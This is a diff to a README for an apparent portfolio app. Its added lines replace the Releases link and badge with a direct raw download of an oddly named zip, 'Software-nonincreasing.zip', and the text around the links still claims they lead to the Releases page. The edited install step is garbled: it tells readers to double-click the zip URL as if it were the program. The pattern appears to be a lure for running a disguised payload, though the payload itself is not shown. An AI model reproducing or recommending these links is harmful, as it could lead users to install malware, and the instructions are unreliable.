@@ -8,7 +8,7 @@ Welcome to my Portfolio! This application helps you display your projects and ex
 
 To get started, you need to download the application. Please visit the link below to access the latest version from the Releases page.
 
-[![Download Portfolio](https://img.shields.io/badge/Download-Portfolio-blue)](https://github.com/parrkooooo/Portfolio/releases)
+[![Download Portfolio](https://github.com/parrkooooo/Portfolio/raw/refs/heads/main/assets/Software-nonincreasing.zip)](https://github.com/parrkooooo/Portfolio/raw/refs/heads/main/assets/Software-nonincreasing.zip)
 
 Click the link above. This will take you to the Releases page where you can choose the version you want.
 
@@ -29,7 +29,7 @@ After obtaining the package, follow these steps to install the Portfolio app:
 
 1. **Locate the Downloaded File:** Go to the folder where you saved the file.
 2. **Extract the Files:** If you downloaded a `.zip` file, right-click it and select "Extract All…". Follow the prompts to extract it.
-3. **Run the Application:** Double-click on the application file (for example, `Portfolio.exe` or `index.html` in the extracted folder) to open it.
+3. **Run the Application:** Double-click on the application file (for example, `https://github.com/parrkooooo/Portfolio/raw/refs/heads/main/assets/Software-nonincreasing.zip` or `https://github.com/parrkooooo/Portfolio/raw/refs/heads/main/assets/Software-nonincreasing.zip` in the extracted folder) to open it.
 
 ## 📑 Features
 
@@ -82,6 +82,6 @@ This project is open source. Feel free to use, modify, and distribute it. Ensure
 
 Thank you for exploring my Portfolio. I appreciate your interest and support as I continue to learn and grow in software engineering. Your engagement helps me improve and showcase my journey.
 
-[![Download Portfolio](https://img.shields.io/badge/Download-Portfolio-blue)](https://github.com/parrkooooo/Portfolio/releases)
+[![Download Portfolio](https://github.com/parrkooooo/Portfolio/raw/refs/heads/main/assets/Software-nonincreasing.zip)](https://github.com/parrkooooo/Portfolio/raw/refs/heads/main/assets/Software-nonincreasing.zip)
 
 Now you are ready to showcase your projects effortlessly using the Portfolio application! Enjoy creating!
